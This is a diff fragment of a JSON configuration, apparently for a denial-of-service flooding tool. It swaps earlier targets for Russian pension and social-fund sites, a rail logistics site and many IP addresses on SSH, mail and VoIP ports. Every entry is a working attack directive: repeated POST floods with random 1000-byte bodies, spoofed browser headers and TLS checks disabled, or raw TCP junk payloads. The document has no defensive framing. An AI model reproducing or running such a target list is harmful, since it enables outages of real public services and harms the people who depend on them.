+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://selfcare.sfri.ru",
+                                "Referer": "http://selfcare.sfri.ru",
+                                "X-Forwarded-Host": "selfcare.sfri.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://school.sfr.gov.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "school.sfr.gov.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://school.sfr.gov.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://school.sfr.gov.ru",
+                                "Referer": "http://school.sfr.gov.ru",
+                                "X-Forwarded-Host": "school.sfr.gov.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.62:2000",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.62:2000"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.53.66:8090",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.53.66:8090"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.8:143",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.8:143"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://s101cl.101.pfr.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "s101cl.101.pfr.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://s101cl.101.pfr.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://s101cl.101.pfr.ru",
+                                "Referer": "http://s101cl.101.pfr.ru",
+                                "X-Forwarded-Host": "s101cl.101.pfr.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.53.66:1935",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.53.66:1935"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.133.235.172:110",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.133.235.172:110"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.62:1720",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.62:1720"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://ftp.it.pfr.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "ftp.it.pfr.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1224,7 +2341,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://cinema1909.ru",
+                            "path": "https://ftp.it.pfr.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1237,9 +2354,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://cinema1909.ru",
-                                "Referer": "https://cinema1909.ru",
-                                "X-Forwarded-Host": "cinema1909.ru",
+                                "Origin": "https://ftp.it.pfr.ru",
+                                "Referer": "https://ftp.it.pfr.ru",
+                                "X-Forwarded-Host": "ftp.it.pfr.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1250,14 +2367,80 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://illuzion-cinema.ru",
+            "count": 10,
+            "name": "tcp://84.47.160.218:22",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "illuzion-cinema.ru:443",
+                        "address": "84.47.160.218:22"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.64:143",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.64:143"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.82:1720",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.82:1720"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://www.rzdlog.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "www.rzdlog.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1268,7 +2451,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://illuzion-cinema.ru",
+                            "path": "https://www.rzdlog.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1281,9 +2464,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://illuzion-cinema.ru",
-                                "Referer": "https://illuzion-cinema.ru",
-                                "X-Forwarded-Host": "illuzion-cinema.ru",
+                                "Origin": "https://www.rzdlog.ru",
+                                "Referer": "https://www.rzdlog.ru",
+                                "X-Forwarded-Host": "www.rzdlog.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1294,14 +2477,80 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "tcp://185.240.102.226:22",
+            "count": 10,
+            "name": "https://mx.0100.pfr.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "185.240.102.226:22"
+                        "address": "mx.0100.pfr.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://mx.0100.pfr.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://mx.0100.pfr.ru",
+                                "Referer": "https://mx.0100.pfr.ru",
+                                "X-Forwarded-Host": "mx.0100.pfr.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.31:22",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.31:22"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.39:22",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.39:22"
                     }
                 },
                 "packet": {
